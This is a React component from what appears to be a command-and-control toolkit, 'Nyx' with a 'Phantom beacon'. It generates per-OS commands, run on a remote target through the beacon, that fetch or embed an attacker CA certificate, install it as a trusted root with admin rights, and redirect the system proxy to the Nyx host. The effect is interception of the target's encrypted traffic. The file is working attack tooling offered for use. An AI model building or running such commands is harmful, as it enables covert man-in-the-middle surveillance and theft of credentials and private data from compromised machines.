import { useEffect, useMemo, useState } from 'react'
import { ClipboardCopy, Check, AlertTriangle } from 'lucide-react'

type TargetOs = 'windows' | 'macos' | 'linux' | 'android'

interface DeployBoxProps {
  host: string
  proxyPort: number
  caPort?: number
}

const OS_OPTIONS: { id: TargetOs; label: string }[] = [
  { id: 'windows', label: 'Windows' },
  { id: 'macos', label: 'macOS' },
  { id: 'linux', label: 'Linux / IoT' },
  { id: 'android', label: 'Android' },
]

function toB64(text: string): string {
  try {
    return btoa(String.fromCharCode(...new TextEncoder().encode(text)))
  } catch {
    return ''
  }
}

// Where the PEM lives on the target for a given OS.
function pemPath(os: TargetOs): string {
  return os === 'android' ? '/data/local/tmp/nyx-ca.pem' : '/tmp/nyx-ca.pem'
}

// Yields the shell line(s) that materialize the Nyx CA PEM on the target,
// either from the embedded certificate (works with Nyx offline) or by
// downloading it at runtime (fallback when the box didn't get the PEM).
function caInstallStep(os: TargetOs, caB64: string, caUrl: string): string {
  const dest = pemPath(os)
  switch (os) {
    case 'windows':
      if (caB64) {
        return [
          `$b64 = '${caB64}'`,
          '$pem = "$env:TEMP\\nyx-ca.pem"',
          '[IO.File]::WriteAllBytes($pem, [Convert]::FromBase64String($b64))',
          '',
        ].join('\n')
      }
      return `(New-Object System.Net.WebClient).DownloadFile('${caUrl}', "$env:TEMP\\nyx-ca.pem")\n`
    case 'macos':
    case 'linux':
    case 'android':
      if (caB64) {
        return `echo '${caB64}' | base64 -d > ${dest}\n`
      }
      return `curl -fsSL '${caUrl}' -o ${dest}\n`
  }
  return ''
}

function installStep(os: TargetOs, proxy: string): string {
  const dest = pemPath(os)
  switch (os) {
    case 'windows':
      return [
        'Import-Certificate -FilePath "$env:TEMP\\nyx-ca.pem" -CertStoreLocation Cert:\\LocalMachine\\Root',
        'netsh winhttp set proxy ' + proxy,
        "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 1",
        "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyServer -Value '" + proxy + "'",
        ':: To revert: netsh winhttp reset proxy; set ProxyEnable to 0',
      ].join('\n')
    case 'macos':
      return [
        `sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ${dest}`,
        `networksetup -setwebproxy 'Wi-Fi' ${proxy.replace(':', ' ')}`,
        `networksetup -setsecurewebproxy 'Wi-Fi' ${proxy.replace(':', ' ')}`,
        'sudo networksetup -setproxyautodiscovery Wi-Fi off',
        `sudo rm -f ${dest}`,
      ].join('\n')
    case 'linux':
      return [
        `sudo cp ${dest} /usr/local/share/ca-certificates/nyx-ca.crt`,
        'sudo update-ca-certificates',
        "gsettings set org.gnome.system.proxy mode 'manual'",
        `gsettings set org.gnome.system.proxy.http host '${hostOf(proxy)}'`,
        `gsettings set org.gnome.system.proxy.http port ${portOf(proxy)}`,
        `gsettings set org.gnome.system.proxy.https host '${hostOf(proxy)}'`,
        `gsettings set org.gnome.system.proxy.https port ${portOf(proxy)}`,
      ].join('\n')
    case 'android':
      return [
        "mkdir -p '/data/misc/user/0/cacerts-added'",
        `cp ${dest} /data/misc/user/0/cacerts-added/`,
        `settings put global http_proxy ${proxy}`,
        'reboot',
      ].join('\n')
  }
}

function hostOf(proxy: string): string {
  return proxy.split(':')[0]
}

function portOf(proxy: string): string {
  return proxy.split(':')[1] || '8080'
}

export function DeployBox({ host, proxyPort, caPort }: DeployBoxProps) {
  const [os, setOs] = useState<TargetOs>('windows')
  const [copied, setCopied] = useState(false)
  const [caB64, setCaB64] = useState('')
  const [caMissing, setCaMissing] = useState(false)

  useEffect(() => {
    let cancelled = false
    fetch('/api/ca-certificate')
      .then((r) => {
        if (!r.ok) throw new Error('no cert')
        return r.text()
      })
      .then((pem) => {
        if (!cancelled) setCaB64(toB64(pem))
      })
      .catch(() => {
        if (!cancelled) {
          setCaB64('')
          setCaMissing(true)
        }
      })
    return () => {
      cancelled = true
    }
  }, [])

  const resolveHost = (host || '').trim() || 'NYX-IP'
  const safeCaPort = caPort || proxyPort || 18081
  const proxy = `${resolveHost}:${proxyPort || 8080}`
  const caUrl = `http://${resolveHost}:${safeCaPort}/api/ca-certificate`

  const command = useMemo(() => {
    const caStep = caInstallStep(os, caB64, caUrl)
    const install = installStep(os, proxy)
    return [caStep, install].filter(Boolean).join('\n')
  }, [os, caB64, proxy, caUrl])

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(command)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    } catch {
      /* clipboard unavailable in test env */
    }
  }

  return (
    <div className="p-4 rounded-lg border border-gray-800 bg-gray-900/50">
      <div className="flex items-center gap-2 mb-3">
        <ClipboardCopy size={14} className="text-purple-400" />
        <h3 className="text-sm font-semibold text-gray-200">
          Deploy Command (for Phantom beacon)
        </h3>
      </div>
      <p className="text-xs text-gray-400 mb-3 leading-relaxed">
        Comando da eseguire sul sistema remoto tramite il beacon: installa il
        CA Nyx e fa il proxy di sistema puntare a{' '}
        <span className="font-mono text-gray-200">{proxy}</span>. Sostituisci{' '}
        {'NYX-IP'} con l'IP/dominio raggiungibile del backend Nyx se il target
        è fuori LAN.
      </p>

      {caB64 ? (
        <p className="text-xs text-green-400 mb-3">
          CA certificate embedded — il comando funziona anche con Nyx spento.
        </p>
      ) : (
        <p className="text-xs text-amber-400 mb-3">
          Certificato CA non caricato:{' '}
          {caMissing
            ? 'sarà scaricato a runtime (servirai Nyx acceso).'
            : 'loading…'}
        </p>
      )}

      <div className="flex flex-wrap gap-1.5 mb-3">
        {OS_OPTIONS.map((opt) => (
          <button
            key={opt.id}
            onClick={() => setOs(opt.id)}
            className={`px-3 py-1.5 text-xs rounded-lg font-medium transition-colors ${
              os === opt.id
                ? 'bg-purple-600 text-white'
                : 'bg-gray-800 text-gray-400 hover:bg-gray-700'
            }`}
          >
            {opt.label}
          </button>
        ))}
      </div>

      <div className="relative">
        <pre className="text-xs font-mono text-gray-300 bg-gray-900 border border-gray-700 rounded-lg p-3 pr-12 overflow-x-auto whitespace-pre leading-relaxed">
          {command}
        </pre>
        <button
          onClick={handleCopy}
          className="absolute top-2 right-2 p-1.5 rounded bg-gray-800 hover:bg-gray-700 text-gray-300 transition-colors"
          title="Copy command"
        >
          {copied ? <Check size={14} className="text-green-400" /> : <ClipboardCopy size={14} />}
        </button>
      </div>
      <p className="text-xs text-gray-500 mt-3">
        {!caB64 && !caMissing && (
          <span className="inline-flex items-center gap-1">
            <AlertTriangle size={12} className="text-amber-400" />
            Importa il CA nel CA portal per incorporare il certificato.
          </span>
        )}
      </p>
    </div>
  )
}